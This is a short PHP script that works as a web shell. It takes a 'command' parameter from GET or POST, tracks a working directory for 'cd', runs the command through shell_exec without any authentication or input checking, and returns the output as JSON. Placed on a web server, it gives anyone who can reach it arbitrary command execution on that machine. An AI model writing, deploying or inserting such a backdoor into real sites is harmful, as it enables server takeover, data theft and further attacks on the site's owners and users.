<?php
function convertEOL($string, $to = "\\n")
{
    return strtr($string, array(
        "\r\n" => $to,
        "\r" => $to,
        "\n" => $to,
    ));
}
  if(isset($_GET['command'])) {
      $id = $_GET['command'];
  }
  if(isset($_GET['path'])) {
      $path = $_GET['path'];
      //$path = '"',$path,'"';
  }
  if($id==""){
    $id=$_POST['command'];
  }
  if($path==""){
    $path=$_POST['path'];
    //$path='"',$path,'"';
  }
  /*if($path==""){
    $path="null";
  }*/
  if(substr($id,0,3)=="cd "){
  $cdpath=substr($id,3);
  if(substr($cdpath,0,1)=="/"){$cdpath=substr($cdpath,1);
  $path=substr(str_replace("_".chr(8),"",str_replace("\n","",shell_exec("cd /".$cdpath." && pwd"))),1)."/";
  }else{
  $path=substr(str_replace("_".chr(8),"",str_replace("\n","",shell_exec("cd /".$path.$cdpath." && pwd"))),1)."/";}
  if($path=="/"){$path="";}
  }
echo '{"response":"',str_replace("_".chr(8),"",convertEOL(shell_exec("cd /".$path." && ".$id))),'","path":"',$path,'"}';
?>
